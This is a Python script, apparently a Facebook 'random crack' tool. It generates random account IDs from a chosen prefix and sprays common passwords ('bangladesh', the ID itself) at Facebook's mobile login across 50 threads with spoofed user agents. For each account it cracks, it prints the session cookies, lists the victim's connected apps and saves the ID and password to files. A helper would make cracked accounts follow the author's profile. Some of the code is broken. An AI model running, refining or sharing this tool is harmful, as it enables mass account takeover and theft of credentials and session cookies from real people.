import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
def khld():
    os.system('clear')
    jalan(logo)
    print('\033[1;92m')
    jalan('\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m RANDOM CRACK ')
    jalan('\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m CONTACT ME FACEBOOK')
    jalan('\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m FOLLOW GITHUB ACCOUNT')
    jalan('\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m FOLLOW PAGE')
    jalan('\033[1;91m[\033[1;92m0\033[1;91m]\033[1;91m EXIT')
    opt = input('\n\x1b[1;32m\033[1;91m[\033[1;92m\033[1;91m]\033[1;32mCHOOSE : ')
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-open https://www.facebook.com/RAX-CYBER-404')
        return None
    if None == '3':
        os.system('xdg-open https://github.com/RAX-404')
        return None
    if None == '4':
        os.system('xdg-open https://youtube.com/c/RAXTechBd1?utm_source=EKLEiJECCKjOmKnC5IiRIQ')
    if None == '0':
        os.system('exit')
        return None
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[ðŸŽ®] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;92m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""   
 \x1b[1;33m_____              __   __
 \x1b[1;33m|  __ \      /\     \ \ / /
 \x1b[1;33m| |__) |    /  \     \ V / 
 \x1b[1;33m|  _  /    / /\ \     > <  
 \x1b[1;33m| | \\   / ____ \   / . \ 
 \x1b[1;33m|_|  \_\ /_/    \_\ /_/ \_\                                
print(55*"\033[1;92m=")
\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m AUTHOR  \033[1;91m : \033[1;92mACTION-RAX
\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m FACEBOOK\033[1;91m : \033[1;92mFT ALVI
\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m GITHUB  \033[1;91m : \033[1;92mACTION-FORE
\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m TOOLS   \033[1;91m : \033[1;92mRANDOM CRACK
\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m VERSION \033[1;91m : \x1b[1;33m0.0.1
print(55*"\033[1;92m=")
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    jalan('\033[1;92m')
    jalan('\033[1;91m[\033[1;92m\033[1;91m]\033[1;32mEXAMPLE    - \033[1;32m016 \033[1;32m017 \033[1;32m018 \033[1;32m019')
    jalan('\033[1;92m\n')
    code = input('\033[1;35m\033[1;91m[\033[1;92m\033[1;91m]\033[1;32mINPUT CODE : ')
    print("")
    os.system('clear')
    bal = input("ENTER YOUR NAME : ")
    os.system('clear')
    print(logo)
    limit = int(input('EXAMPLE: 3000, 5000, 15000, 20000\n\n\033[1;91m\033[1;91m[\033[1;92m\033[1;91m]\033[1;32mINPUT LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(55*"\033[1;92m=")
        print('\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m USER\'S NAME : \033[1;92m'+bal)
        print('\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m COUNTRY CODE : \033[1;90m'+code)
        print('\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m TOTAL IDS : \033[1;92m'+tl)
        print('\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m CRACKING HAS STARTED')
        print('\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]\033[1;92m WORKS ON DATA AND WIFI')
        print(f"\033[1;91m[\033[1;92mâœ”ï¸Ž\033[1;91m]{GREEN} TODAY DATE & TIME :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(55*"\033[1;92m=")
        for love in user:
            pwx = [love,'bangladesh','Bangladesh','free RAX','freeRAX']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    print('CRACK PROCESS HAS BEEN COMPLETED ')
    print('IDS SAVED IN RAX-OK.txt, RAX-CP.txt')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {
			'authority': 'p.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[RAX-OK] ' +uid+ ' | ' +ps+    '  \n\033[1;35m[âˆš]\033[1;32mCOOKIE = \033[1;34m'+coki+  ' \n\033[1;36m[âˆš] [AGENT] = \033[1;35m'+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RAX-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[RAX-CP]  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RAX-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[RAX-XD] %s/%s  OK: %s  '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass

khld()
